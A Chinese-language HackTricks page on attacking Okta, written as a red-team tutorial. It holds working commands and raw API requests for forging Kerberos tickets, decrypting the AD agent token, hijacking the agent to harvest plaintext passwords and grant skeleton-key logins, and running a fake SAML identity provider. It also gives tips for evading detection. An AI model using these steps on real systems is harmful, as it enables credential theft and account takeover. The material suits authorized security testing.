# Okta安全

<details>

<summary><strong>支持HackTricks并获得福利！</strong></summary>

* 如果您想在HackTricks中看到您的公司广告，或者如果您想访问PEASS的最新版本或下载PDF版的HackTricks，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFT**](https://opensea.io/collection/the-peass-family)收藏品
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram群组**](https://t.me/peass) 或 **关注**我的 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* 通过向 [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交PR来分享您的黑客技巧。

</details>

## 基本信息

Okta, Inc. 是一家**身份和访问管理公司**，提供云软件来帮助公司**管理和保护用户认证现代应用程序**，以及为开发人员构建身份控制应用程序、网站、网络服务和设备。

他们的核心服务称为Okta Identity Cloud，提供的产品包括单点登录（SSO）、多因素身份验证（MFA）、生命周期管理、通用目录、API访问管理等。这有助于公司保护敏感数据，同时简化用户访问，使员工或客户更容易访问和使用应用程序和服务。

Okta的服务广泛应用于企业环境，以及小型公司和开发人员。它在帮助企业安全地采用和管理云技术方面发挥着关键作用。截至我在2021年9月的知识截止日期，Okta仍然是身份和访问管理（IAM）行业的重要参与者。

{% hint style="danger" %}
Okta的主要目标是配置不同用户和组对外部应用程序的访问。如果您成功地在Okta环境中**获取管理员权限**，您很可能能够**入侵公司使用的所有其他平台**。
{% endhint %}

{% hint style="success" %}
要对Okta环境进行安全审查，您应该要求获得**管理员只读访问权限**。
{% endhint %}

### 概要

有**用户**（可以**存储在Okta中**，从配置的**身份提供者**登录，或通过**Active Directory**或LDAP进行身份验证）。\
这些用户可以在**组**内。\
还有**认证器**：不同的身份验证选项，如密码，以及几种2FA，如WebAuthn、电子邮件、电话、okta verify（它们可以启用或禁用）...

然后，有与Okta同步的**应用程序**。每个应用程序都将与Okta进行一些**映射**以共享信息（如电子邮件地址、名字等）。此外，每个应用程序必须位于**身份验证策略**中，该策略指示用户访问应用程序所需的**认证器**。

{% hint style="danger" %}
最强大的角色是**超级管理员**。

如果攻击者以管理员访问权限入侵Okta，所有**信任Okta的应用程序**很可能都会被**入侵**。
{% endhint %}

## 攻击

### 定位Okta门户

通常，公司的门户将位于**companyname.okta.com**。如果没有，请尝试简单的**companyname**的**变体**。如果找不到，也有可能组织有一个指向**Okta门户**的**CNAME**记录，如**`okta.companyname.com`**。

### 通过Kerberos登录Okta

（攻击从[**这里**](https://trustedsec.com/blog/okta-for-red-teamers)复制）。

如果存在类似**`companyname.kerberos.okta.com`**的域，则在公司内配置了Kerberos以访问Okta。这非常有趣，因为通常Windows用户不需要MFA来访问Okta。

还可以通过运行以下命令在AD环境中找到配置了Okta访问权限的Kerberos用户：
```bash
getST.py -spn HTTP/clientname.kerberos.okta.com -dc-ip 1.2.3.4 LAB/comprommiseduser
```
当我们获取了AD用户的票据后，我们需要使用Rubeus或Mimikatz将其注入到我们控制的主机上：

<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

您需要确保将`clientname.kerberos.okta.com`添加到Internet选项的“内部网”安全区域中。然后，在我们的浏览器中，如果我们访问下面的URL，我们应该会收到一个JSON响应，当Kerberos票据被接受时，它会提供一个`OK`的结果：

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

转到Okta仪表板，如果一切正常，您将登录成功。

此外，如果我们能够破坏实际的Okta服务账户，暴露委派SPN，我们可以进行Silver Ticket攻击。

需要注意的是，由于Okta仅支持使用AES进行票据加密，我们需要确保我们拥有AES密钥或明文密码进行身份验证：

<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

为了为受害者用户`testuser`制作我们的票据，我们使用：

{% code overflow="wrap" %}
```bash
ticketer.py -domain-sid S-1-5-21-4170871944-1575468979-147100471 -domain lab.local -dc-ip DC01 -aesKey db22ab9c89f2f0d545024f9dfabbed44173397065d8f5b7e172200ca38ed4393 -user-id 1118 -spn HTTP/example.kerberos.okta.com testuser
```
{% endcode %}

然后，通过我们的浏览器会话将其发送给Okta：

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

### 劫持Okta AD代理

（攻击从[**这里**](https://trustedsec.com/blog/okta-for-red-teamers)复制而来）。

如果您访问运行Okta AD代理的服务器。该代理负责将域用户和组同步到Okta以进行配置，并在用户登录到门户时回答Okta的身份验证请求。

默认情况下，代理安装到：
```bash
C:\Program Files (x86)\Okta\Okta AD Agent
```
我们将查看`OktaAgentService.exe.config`文件，其中包含一些有趣的XML内容：

<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

Base64编码的`AgentToken`是我们的目标。如果我们在dnSpy中打开`OktaAgentService.exe`，我们可以看到这些值是如何解密的：

<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

没错..就是老好人DPAPI！`RandomEntropy`的值设置为：

<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

这意味着我们可以使用以下方法解密这个Base64编码的XML值：
```powershell
Add-Type -AssemblyName 'System.Security'
$rand = [byte]174,53,167,191,10,250,125,232,223,147,248,86,65

$k = [System.Security.Cryptography.ProtectedData]::Unprotect([System.Convert]::FromBase64String("AQAAANCMnd8BFdERjH..."), $rand, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
[System.Text.Encoding]::Unicode.GetString($k)
```
使用的DPAPI主密钥属于运行“Okta AD Agent”服务的用户帐户，因此您需要在服务帐户的上下文中运行上述命令，或者获取该帐户的主密钥并进行解密：

<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

例如，在`OktaAgentService.exe.config`文件中，我们还有两个XML字段，即`APPID`和`AGENTID`。结合`AgentToken`，我们可以进行如下的`GET`请求：
```xml
GET /api/1/internal/app/activedirectory/[APPID]/agent/[AGENTID]/nextAction?agentVersion=1&pollid=anything HTTP/1.1
Host: client.okta.com
Authorization: SSWS 00OfIl_Gi1rZu1NETmHo6auU6YZEOEn8ZlDhyqstiZ
```
此调用将阻塞，直到用户通过Okta进行身份验证（或请求超时），在这种情况下，它将返回下一个提供的明文用户名和密码：
```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<action>
<UserAuth actionId="rpc::app.active_directory.agent.reply.ok14-majorecs02a.auw2-ok14.internal//1670637714886//Y5PojoeQQ3KDgHHzA11P9wAAC8g:e9088489-99ff-435a-943b-b7dccc457cb5:">
<type>USER_AUTH</type>
<password>abc123</password>
<useLdapGroupPasswordPolicy>false</useLdapGroupPasswordPolicy>
<userName>domuser@lab.local</userName>
</UserAuth>
</action>
```
虽然这样可以捕获凭据，但我们也有机会在身份验证尝试时进行回复，如果我们想要执行类似提供骨干密钥的操作。我们通过发送以下HTTP请求来实现：
```xml
POST /api/1/internal/app/activedirectory/0oa7c027u2tcjxoki697/agent/a537ca54okqfsuu0s697/actionResult?responseid=12345 HTTP/1.1
Host: client.okta.com
Authorization: SSWS 00JFtjd...WgkeI1Eg5Y
Content-Type: application/xml; charset=utf-8
Content-Length: 1362

<agentActionResult xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" actionId="rpc::app.active_directory.agent.reply.ok14-majorecs04a.auw2-ok14.internal//1694301421033//ZPz86MzEBzhpMhSFWzyK5wAAA_Q:440a7d52-704b-4c1b-ac79-afdc241e3080:">
<type>USER_AUTH</type>
<status>SUCCESS</status>
<message></message>
<errorCode></errorCode>
<timestamps>
<actionRecieivedFromOkta>1694358076</actionRecieivedFromOkta>
<actionSentToLdapServer>1694358076</actionSentToLdapServer>
<responseReceivedFromLdapServer>1694358076</responseReceivedFromLdapServer>
<responseSentToOkta>1694358076</responseSentToOkta>
<actionReceivedFromOktaMilliseconds>20230910150116.726Z</actionReceivedFromOktaMilliseconds>
<actionSentToLdapServerMilliseconds>20230910150116.741Z</actionSentToLdapServerMilliseconds>
<responseReceivedFromLdapServerMilliseconds>20230910150116.741Z</responseReceivedFromLdapServerMilliseconds>
<responseSentToOktaMilliseconds>20230910150116.741Z</responseSentToOktaMilliseconds>
</timestamps>
<additionalInfo>{{"ExecutionTime":"12","AgentUpTime":"0 day(s) 22:41:49","DC":"DC01.lab.local","DomainControllerFunctionality":"WIN2016","DomainFunctionality":"WIN2016","ForestFunctionality":"WIN2016","LdapResponseTime":"0"}}</additionalInfo>
</agentActionResult>
```
发出此请求的结果是允许通过Okta对任何用户进行身份验证。

### 作为管理员劫持AD

（攻击从[**这里**](https://trustedsec.com/blog/okta-for-red-teamers)复制而来）。

我们知道我们可以使用窃取的代理令牌劫持Okta AD代理，但是如果我们已经入侵了一个特权的Okta账户，并且想要在没有现有代理令牌的情况下进行此操作呢？让我们看看如何做到这一点。

首先，我们需要创建一个Okta AD代理API令牌。为了启动身份验证流程，我们需要一个OAuth代码。为了获得这个代码，我们首先前往：

{% code overflow="wrap" %}
```
https://example.okta.com/oauth2/authorize?redirect_uri=%2Foauth-response&response_type=code&client_id=cappT0Hfy97F1BoO1UTR&prompt=select_account
```
{% endcode %}

这将为您提供一个权限提示，让您接受：

<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

接受提示后，您将被重定向到`/oauth-response`，并带有一个`code`参数：

<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

我们需要使用POST请求获取API令牌，其中包含这个`code`参数：
```
POST /oauth2/token HTTP/1.1
User-Agent: Okta AD Agent/3.16.0 (Microsoft Windows NT 6.2.9200.0; .NET CLR 4.0.30319.42000; 64-bit OS; 64-bit Process; sslpinning=disabled)
Content-Type: application/x-www-form-urlencoded
Host: example.okta.com
Content-Length: 65
Expect: 100-continue
Accept-Encoding: gzip, deflate
Connection: Keep-Alive

grant_type=api_token&code=7vzn01sl&client_id=cappT0Hfy97F1BoO1UTR
```
响应将返回我们的API令牌：
```
{"api_token":"00456b2Lllk2KqjLBvaxANWEgTd7bqjsxjo8aZj0wd"}
```
使用此令牌，我们需要将其与活动的AD域关联起来。我们使用API调用来完成此操作：
```
POST /api/1/internal/app/activedirectory/ HTTP/1.1
User-Agent: Okta AD Agent/3.16.0 (Microsoft Windows NT 6.2.9200.0; .NET CLR 4.0.30319.42000; 64-bit OS; 64-bit Process; sslpinning=disabled)
Host: example.okta.com
Accept: application/xml; charset=UTF-8
Content-Type: application/xml; charset=UTF-8
Content-Length: 86
Authorization: SSWS 00456b2Lllk2KqjLBvaxANWEgTd7bqjsxjo8aZj0wd

<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<domain name="lab.local" />
```
这将返回以下XML响应，我们需要保留`id`属性值以供以后使用
```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<activeDirectory id="0oa4jsza16ar1UdaW696">
<name>lab.local</name>
<newInstance>false</newInstance>
</activeDirectory>
```
接下来，我们通过HTTP API调用来为我们的连接器命名：
```
POST /api/1/internal/app/activedirectory/0oa4jsza16ar1UdaW196/agent?name=DC02 HTTP/1.1
Host: example.okta.com
Content-Type: text/xml
Content-Length: 0
Authorization: SSWS 00456b2Lllk2KqjLBvaxANWEgTd7bqjsxjo8aZj0wd
```
这将返回一个XML响应，我们需要保留`id`属性：

{% code overflow="wrap" %}
```
<?xml version="1.0" encoding="UTF-8" standalone="yes"?><agent id="a532camqiqXMhlOf5697"><name>DC02</name></agent>
```
{% endcode %}

最后，我们初始化连接以允许接收数据：
```xml
POST /api/1/internal/app/activedirectory/0oa4jsza16ar1UdaW196/agent/a532camqiqXMhlOf5697/actionResult?agentVersion=3.13.0.0 HTTP/1.1
Host: example.okta.com
Content-Type: text/xml
Content-Length: 825
Authorization: SSWS 00456b2Lllk2KqjLBvaxANWEgTd7bqjsxjo8aZj0wd

<agentActionResult xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
<type>INIT</type>
<status>SUCCESS</status>
<timestamps>
<actionRecieivedFromOkta />
<actionSentToLdapServer />
<responseReceivedFromLdapServer />
<responseSentToOkta>1694304008</responseSentToOkta>
<actionReceivedFromOktaMilliseconds>00010101000000.000Z</actionReceivedFromOktaMilliseconds>
<actionSentToLdapServerMilliseconds>00010101000000.000Z</actionSentToLdapServerMilliseconds>
<responseReceivedFromLdapServerMilliseconds>00010101000000.000Z</responseReceivedFromLdapServerMilliseconds>
<responseSentToOktaMilliseconds>20230910000008.174Z</responseSentToOktaMilliseconds>
</timestamps>
<additionalInfo>{}</additionalInfo>
</agentActionResult>
```
完成这一步骤后，我们的伪造AD代理已经准备就绪，并将处理之前展示的身份验证尝试。

显然，我们不希望使用Burp来完成所有这些操作，因此已经创建了一个工具来支持一些用例。该工具可以从[这里](https://github.com/xpn/OktaPostExToolkit)获取。

我们可以在该工具的第一个模式中运行，即`token`模式，它接收一个被入侵的代理令牌值，并连接到Okta API，将接收到的任何凭据进行转储：

{% code overflow="wrap" %}
```bash
python ./main.py --tenant-domain example.okta.com --skeleton-key WibbleWobble99 token --api-token 00456b2Lllk2KqjLBvaxANWEgTd7bqjsxjo8aZj0wd --app-id 0oa7c027u2TcJxoki697 --agent-id a537cnm9ldwPILkqP697
```
视频示例：

* [https://www.youtube.com/watch?v=ZYRcfj6jtaA](https://www.youtube.com/watch?v=ZYRcfj6jtaA)
* [https://youtu.be/Sob2u6xEjTE](https://youtu.be/Sob2u6xEjTE)

该工具还允许注册新的AD连接器，如果我们有一个使用Okta用户的管理员凭据可用的话，可以使用以下命令：
```bash
python ./main.py --tenant-domain example.okta.com --skeleton-key WibbleWobble99 oauth --machine-name DC01 --windows-domain lab.local --code OAUTH_CODE_HERE
```
{% endcode %}

### Okta假SAML提供者

（攻击技术从[**这里**](https://trustedsec.com/blog/okta-for-red-teamers)复制而来）。

在评估过程中非常有用的另一种技术是部署一个假的SAML提供者。

最近，Okta实际上提供了[一个安全更新](https://sec.okta.com/articles/2023/08/cross-tenant-impersonation-prevention-and-detection)，用于防范使用这种技术的实际攻击，因此了解这一点在模拟环境中模拟活动时非常有用，特别是对于希望测试对这种特定攻击的检测的客户来说。

如果我们拥有一个高级的Okta帐户，我们可以作为Okta功能的一部分部署一个外部身份提供者。这允许外部提供者（如Entra ID）在重定向用户到Okta选择集成应用程序之前完成身份验证。

但是，如果我们控制IDP会发生什么呢？嗯，在这种情况下，我们可以批准任何我们想要的身份验证请求。

为了测试这一点，我们需要部署一个自定义的身份提供者。可以在[这里](https://github.com/xpn/OktaPostExToolkit)找到一个非常简陋的支持我们邪恶活动的SAML IDP。这个工具的核心思想是允许我们发出与我们喜欢的任何用户对应的已签名的SAML身份验证响应。

该服务器将在`/saml`上监听传入的HTTP请求，因此我们首先需要将IDP部署到Okta上。

首先，我们选择SAML 2.0 IDP：

<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

在配置IDP时，我们需要注意一些设置。第一个是`Name`，这是要显示给任何其他Okta管理员的友好名称。

接下来是发行者URL，应设置为URI格式的标识符的值。这个值可以是任何值，但我们将使用`https://www.example.com/`。

<figure><img src="../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

我们还需要将`IdP Single Sign-On URL`字段设置为我们的SAML服务器运行的位置。现在，有趣的是，这个URL不需要指向我们的服务器。我觉得值得指出的是，我们在这里输入的URL可以非常有创意，让蓝队的工作变得更加困难。例如，如果我们愿意，我们可以将此字段设置为`https://idp.google.com/saml`，我们唯一需要做的就是捕获传入的SAML请求。这里有个很酷的事情：SAML请求是在客户端上转发的。我的意思是，Okta将生成SAML `AuthRequest`并让我们的浏览器重定向到`https://idp.google.com/`以及SAML请求。当然，这意味着我们只需要修改本地hosts文件将`idp.google.com`指向`127.0.0.1`：
```bash
echo '127.0.0.1 idp.google.com' | sudo tee -a /etc/hosts
```
我们还需要一个我们控制的签名证书。这可以是自签名的，并且可以使用OpenSSL生成：

{% code overflow="wrap" %}
```bash
openssl req -x509 -newkey rsa:2048 -sha256 -days 365 -nodes -keyout example.com.key -out example.com.crt
```
{% endcode %}

再次强调，您可以根据需要进行创意设计，因为对于此证书的真实性没有具体要求。

生成密钥后，我们只需将证书上传到Okta并创建我们的IDP。

<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

最后，我们需要确保`Match Against`设置为`Okta用户名或电子邮件`，并且`Account Link Policy`设置为`Automatic`，以允许我们对现有的Okta帐户进行身份验证：

<figure><img src="../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

保存所有设置后，我们需要下载元数据：

<figure><img src="../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

然后，为了发起身份验证请求并发出`AuthRequest`，我们导航到`Assertion Consumer Service URL`中显示的URL：

<figure><img src="../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

访问此URL会重定向到我们的内部SAML服务器：

<figure><img src="../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

如果我们提供电子邮件地址，我们会发现我们可以作为任何Okta用户进行身份验证，而无需知道他们的凭据。

让我们在[https://youtu.be/uw1hlKNDG2c](https://youtu.be/uw1hlKNDG2c)中看到这个过程。

### 使用Evilgnix钓鱼Okta门户

在[**这篇博文**](https://medium.com/nickvangilder/okta-for-red-teamers-perimeter-edition-c60cb8d53f23)中，解释了如何准备针对Okta门户的钓鱼活动。

### 同事冒充攻击

可以在Okta中配置每个用户可以拥有和修改的**属性**（如电子邮件或名字）。如果一个**应用程序**将一个用户可以**修改**的**属性**（如ID）作为**信任**的ID，那么他就可以在该平台上**冒充其他用户**。

因此，如果应用程序信任字段**`userName`**，您可能无法更改它（因为通常无法更改该字段），但如果它信任例如**`primaryEmail`**，您可能可以将其更改为同事的电子邮件地址并冒充他（您需要访问该电子邮件并接受更改）。

请注意，这种冒充取决于每个应用程序的配置。只有信任您修改的字段并接受更新的应用程序才会受到影响。\
因此，如果存在该字段，应用程序应该启用此字段：

<figure><img src="../../.gitbook/assets/image (89).png" alt=""><figcaption></figcaption></figure>

我还见过其他一些易受攻击的应用程序，但在Okta设置中没有该字段（最终不同的应用程序配置方式不同）。

找出您是否可以在每个应用程序上冒充任何人的最佳方法是尝试一下！

## 规避行为检测策略 <a href="#9fde" id="9fde"></a>

除非事先披露，否则您可能不会知道是否已实施行为检测策略，直到遇到它们。一个**可能绕过Okta行为检测**策略的方法是完全**避开主要的Okta仪表板**，直接针对Okta应用程序（这将是上面屏幕截图中被红框遮挡的应用程序）。如果您拥有Okta访问令牌，您可以在目标公司的主要Okta登录页面上重放令牌，而是在特定于应用程序的Okta URL上重放令牌。

其他建议包括：

* 小心重放从常用匿名代理和VPN服务中捕获的访问令牌。
* 在重放访问令牌时，使用与客户端使用的相同的用户代理字符串。
* 小心重放从同一IP地址的不同用户捕获的访问令牌。
* 小心重放访问令牌以对抗Okta仪表板。
* 如果您知道受害者将使用的公司IP地址，请考虑阻止除该IP地址或IP范围之外的所有其他流量。

## Okta加固

Okta有很多可能的配置，在此页面上，您将找到如何审查这些配置，以使其尽可能安全：

{% content-ref url="okta-hardening.md" %}
[okta-hardening.md](okta-hardening.md)
{% endcontent-ref %}

## 参考资料

* [https://trustedsec.com/blog/okta-for-red-teamers](https://trustedsec.com/blog/okta-for-red-teamers)
* [https://medium.com/nickvangilder/okta-for-red-teamers-perimeter-edition-c60cb8d53f23](https://medium.com/nickvangilder/okta-for-red-teamers-perimeter-edition-c60cb8d53f23)

<details>

<summary><strong>支持HackTricks并获得福利！</strong></summary>

* 如果您想在HackTricks中看到您的**公司广告**，或者如果您想访问**PEASS的最新版本或下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* 发现我们的独家[NFT收藏品**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram群组**](https://t.me/peass)，或在**Twitter**上**关注**我 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github仓库提交PR来分享您的黑客技巧。**

</details>
